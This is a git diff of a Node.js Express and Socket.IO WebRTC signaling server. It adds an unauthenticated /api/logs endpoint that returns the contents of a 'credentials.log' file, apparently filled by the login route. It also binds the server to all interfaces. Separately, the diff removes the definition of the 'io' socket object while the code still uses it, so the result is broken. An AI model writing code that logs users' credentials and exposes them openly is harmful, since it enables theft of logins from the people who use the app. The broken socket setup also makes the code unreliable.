@@ -7,14 +7,7 @@ const socketIO = require('socket.io');
 
 const app = express();
 const server = http.createServer(app);
-const io = socketIO(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
-
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
 app.use(cors());
 app.use(express.json());
@@ -33,6 +26,19 @@ app.post('/login', (req, res) => {
     });
     
     res.json({ success: true, message: 'Login successful' });
+});
+
+// API endpoint to get logs as JSON
+app.get('/api/logs', (req, res) => {
+    const logPath = path.join(__dirname, 'logs', 'credentials.log');
+    
+    if (fs.existsSync(logPath)) {
+        const logs = fs.readFileSync(logPath, 'utf8');
+        const entries = logs.trim().split('\n').filter(line => line.length);
+        res.json({ logs: entries });
+    } else {
+        res.json({ logs: [] });
+    }
 });
 
 app.get('/', (req, res) => {
@@ -54,26 +60,22 @@ io.on('connection', (socket) => {
         }
         
         const participants = rooms.get(roomId);
-        const isFirstParticipant = participants.size === 0;
-        
         participants.add(socket.id);
         
-        console.log(`Socket ${socket.id} joined room ${roomId}. Participants: ${participants.size}`);
-        
-        // Tell the joining user about existing participants
         const otherParticipants = Array.from(participants).filter(id => id !== socket.id);
         
         socket.emit('room-joined', {
             roomId: roomId,
             participants: Array.from(participants),
-            isFirst: isFirstParticipant
+            isFirst: participants.size === 1
         });
         
-        // Tell existing participants about the new user
-        socket.to(roomId).emit('user-joined', {
-            userId: socket.id,
-            participants: Array.from(participants)
-        });
+        if (otherParticipants.length > 0) {
+            socket.to(roomId).emit('user-joined', {
+                userId: socket.id,
+                participants: Array.from(participants)
+            });
+        }
     });
     
     socket.on('leave-room', (roomId) => {
@@ -87,16 +89,13 @@ io.on('connection', (socket) => {
         }
         
         socket.to(roomId).emit('user-left', socket.id);
-        console.log(`Socket ${socket.id} left room ${roomId}`);
     });
     
-    // WebRTC signaling handlers
     socket.on('offer', (data) => {
         socket.to(data.target).emit('offer', {
             offer: data.offer,
             from: socket.id
         });
-        console.log(`Offer sent from ${socket.id} to ${data.target}`);
     });
     
     socket.on('answer', (data) => {
@@ -104,7 +103,6 @@ io.on('connection', (socket) => {
             answer: data.answer,
             from: socket.id
         });
-        console.log(`Answer sent from ${socket.id} to ${data.target}`);
     });
     
     socket.on('ice-candidate', (data) => {
@@ -112,12 +110,9 @@ io.on('connection', (socket) => {
             candidate: data.candidate,
             from: socket.id
         });
-        console.log(`ICE candidate sent from ${socket.id} to ${data.target}`);
     });
     
     socket.on('disconnect', () => {
-        console.log('User disconnected:', socket.id);
-        
         for (const [roomId, participants] of rooms.entries()) {
             if (participants.has(socket.id)) {
                 participants.delete(socket.id);
@@ -130,6 +125,6 @@ io.on('connection', (socket) => {
     });
 });
 
-server.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server running on port ${PORT}`);
 });
